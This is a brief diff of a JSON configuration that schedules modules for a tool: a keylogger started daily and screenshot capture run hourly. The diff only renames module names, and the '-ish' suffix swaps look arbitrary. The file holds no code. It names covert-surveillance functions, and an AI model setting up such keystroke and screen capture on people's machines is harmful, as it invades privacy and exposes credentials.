@@ -1,7 +1,7 @@
 {
     "modules": [
         {
-            "module": "keyloggerish",
+            "module": "keylogger",
             "command": "start",
             "schedule": {
                 "interval": "daily",
@@ -9,7 +9,7 @@
             }
         },
         {
-            "module": "screenshot",
+            "module": "screenshotish",
             "command": "capture",
             "schedule": {
                 "interval": "hourly"
